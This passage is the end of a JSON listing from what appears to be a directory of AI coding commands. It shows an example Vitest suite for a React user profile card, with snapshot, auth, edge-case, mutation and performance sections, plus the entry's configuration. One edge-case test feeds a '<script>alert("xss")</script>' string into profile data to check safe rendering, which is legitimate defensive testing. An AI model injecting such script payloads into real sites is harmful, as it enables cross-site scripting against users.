renderUserProfileCard({ userId: mockProfile.id });\n      \n      await waitFor(() => {\n        expect(screen.getByTestId('profile-name')).toBeInTheDocument();\n      });\n      \n      expect(container.firstChild).toMatchSnapshot('user-profile-display-mode');\n    });\n    \n    it('should match visual snapshot in edit mode', async () => {\n      const mockProfile = { ...generateValidUser(), id: mockCurrentUser.id };\n      mockFetchUserProfile.mockResolvedValue(mockProfile);\n      \n      const { container } = renderUserProfileCard({ \n        userId: mockProfile.id, \n        editable: true \n      });\n      \n      await waitFor(() => {\n        expect(screen.getByTestId('edit-button')).toBeInTheDocument();\n      });\n      \n      await userEvent.setup().click(screen.getByTestId('edit-button'));\n      \n      expect(container.firstChild).toMatchSnapshot('user-profile-edit-mode');\n    });\n  });\n  \n  describe('Integration Testing', () => {\n    it('should integrate correctly with auth system', async () => {\n      const adminUser = { ...mockCurrentUser, role: 'admin' };\n      const regularUser = generateValidUser();\n      \n      // Test as admin\n      mockUseAuth.mockReturnValue({ user: adminUser });\n      mockFetchUserProfile.mockResolvedValue(regularUser);\n      \n      const { rerender } = renderUserProfileCard({ \n        userId: regularUser.id, \n        editable: true \n      });\n      \n      await waitFor(() => {\n        expect(screen.getByTestId('edit-button')).toBeInTheDocument();\n      });\n      \n      // Switch to regular user\n      mockUseAuth.mockReturnValue({ user: regularUser });\n      \n      rerender(\n        <UserProfileCard \n          userId={regularUser.id} \n          editable={true}\n          onProfileUpdate={vi.fn()}\n        />\n      );\n      \n      expect(screen.queryByTestId('edit-button')).not.toBeInTheDocument();\n    });\n  });\n  \n  describe('Edge Cases', () => {\n    it('should handle extremely long profile data gracefully', async () => {\n      const mockProfile = {\n        ...generateValidUser(),\n        name: 'A'.repeat(1000),\n        bio: 'B'.repeat(10000)\n      };\n      \n      mockFetchUserProfile.mockResolvedValue(mockProfile);\n      \n      renderUserProfileCard({ userId: mockProfile.id });\n      \n      await waitFor(() => {\n        expect(screen.getByTestId('user-profile-card')).toBeInTheDocument();\n      });\n      \n      // Should not break rendering\n      expect(screen.getByTestId('profile-name')).toBeInTheDocument();\n      expect(screen.getByTestId('profile-bio')).toBeInTheDocument();\n    });\n    \n    it('should handle special characters in profile data', async () => {\n      const mockProfile = {\n        ...generateValidUser(),\n        name: 'ÊµãËØïÁî®Êà∑ üöÄ <script>alert(\"xss\")</script>',\n        bio: 'Bio with üéâ emojis and <b>HTML</b> & special chars: @#$%^&*()'\n      };\n      \n      mockFetchUserProfile.mockResolvedValue(mockProfile);\n      \n      renderUserProfileCard({ userId: mockProfile.id });\n      \n      await waitFor(() => {\n        expect(screen.getByTestId('profile-name')).toHaveTextContent(mockProfile.name);\n      });\n      \n      // Should display special characters safely\n      expect(screen.getByTestId('profile-bio')).toHaveTextContent(mockProfile.bio);\n    });\n    \n    it('should handle rapid prop changes', async () => {\n      const user1 = generateValidUser();\n      const user2 = generateValidUser();\n      \n      mockFetchUserProfile.mockImplementation((id) => {\n        if (id === user1.id) return Promise.resolve(user1);\n        if (id === user2.id) return Promise.resolve(user2);\n        return Promise.reject(new Error('User not found'));\n      });\n      \n      const { rerender } = renderUserProfileCard({ userId: user1.id });\n      \n      await waitFor(() => {\n        expect(screen.getByTestId('profile-name')).toHaveTextContent(user1.name);\n      });\n      \n      // Rapidly change user ID\n      rerender(\n        <UserProfileCard \n          userId={user2.id}\n          editable={false}\n          onProfileUpdate={vi.fn()}\n        />\n      );\n      \n      await waitFor(() => {\n        expect(screen.getByTestId('profile-name')).toHaveTextContent(user2.name);\n      });\n      \n      expect(mockFetchUserProfile).toHaveBeenCalledWith(user1.id);\n      expect(mockFetchUserProfile).toHaveBeenCalledWith(user2.id);\n    });\n  });\n});\n\n// Mutation Testing Configuration\nexport const mutationTestConfig = {\n  testMatch: ['**/*.test.{js,jsx}'],\n  mutators: [\n    'ArithmeticOperator',\n    'ArrayDeclaration',\n    'ArrowFunction',\n    'Block',\n    'BooleanLiteral',\n    'ConditionalExpression',\n    'EqualityOperator',\n    'LogicalOperator',\n    'MethodExpression',\n    'ObjectLiteral',\n    'StringLiteral',\n    'UnaryOperator',\n    'UpdateOperator'\n  ],\n  thresholds: {\n    high: 90,\n    low: 80\n  },\n  timeoutMS: 30000,\n  maxConcurrentTestRunners: 4\n};\n\n// Performance benchmarking\nexport const performanceBenchmarks = {\n  'UserProfileCard render time': {\n    threshold: 100, // milliseconds\n    setup: () => {\n      const mockProfile = generateValidUser();\n      mockFetchUserProfile.mockResolvedValue(mockProfile);\n      return { userId: mockProfile.id };\n    },\n    test: (props) => {\n      const start = performance.now();\n      renderUserProfileCard(props);\n      return performance.now() - start;\n    }\n  },\n  'Edit mode transition': {\n    threshold: 50,\n    setup: async () => {\n      const mockProfile = { ...generateValidUser(), id: mockCurrentUser.id };\n      mockFetchUserProfile.mockResolvedValue(mockProfile);\n      \n      renderUserProfileCard({ \n        userId: mockProfile.id, \n        editable: true \n      });\n      \n      await waitFor(() => {\n        expect(screen.getByTestId('edit-button')).toBeInTheDocument();\n      });\n      \n      return { editButton: screen.getByTestId('edit-button') };\n    },\n    test: async ({ editButton }) => {\n      const start = performance.now();\n      await userEvent.setup().click(editButton);\n      await waitFor(() => {\n        expect(screen.getByTestId('save-button')).toBeInTheDocument();\n      });\n      return performance.now() - start;\n    }\n  }\n};\n```\n\n## Advanced Testing Features\n\n### Mutation Testing\n- **Code Quality Assessment**: Measures test suite effectiveness\n- **Fault Detection**: Identifies weak test coverage areas\n- **Test Improvement**: Suggests additional test cases\n- **Quality Metrics**: Provides mutation score and coverage analytics\n\n### Property-Based Testing\n- **Hypothesis Generation**: AI-powered test case creation\n- **Edge Case Discovery**: Automatic boundary value testing\n- **Invariant Verification**: Ensures consistent behavior patterns\n- **Input Space Exploration**: Comprehensive input combination testing\n\n### Visual Regression Testing\n- **UI Consistency**: Detects unintended visual changes\n- **Cross-browser Testing**: Validates appearance across platforms\n- **Responsive Testing**: Ensures mobile/desktop compatibility\n- **Component Isolation**: Tests individual component rendering\n\n### Performance Testing\n- **Render Performance**: Measures component render times\n- **Memory Usage**: Tracks memory leaks and optimization opportunities\n- **User Interaction**: Benchmarks user interaction responsiveness\n- **Load Testing**: Simulates high-frequency usage patterns\n\nThis advanced test generator creates comprehensive, maintainable test suites that ensure code quality, performance, and reliability across all application layers.",
      "configuration": {
        "temperature": 0.2,
        "maxTokens": 16000,
        "systemPrompt": "You are a testing expert specializing in comprehensive test strategy, advanced testing methodologies, and test automation. Generate thorough, maintainable test suites with multiple testing approaches."
      },
      "githubUrl": "https://github.com/claudepro/advanced-test-generator",
      "documentationUrl": "https://docs.claude.ai/commands/test",
      "source": "community",
      "slug": "test-advanced",
      "type": "command",
      "url": "https://claudepro.directory/commands/test-advanced"
    }
  ],
  "count": 10,
  "lastUpdated": "2025-09-16T23:46:56.733Z"
}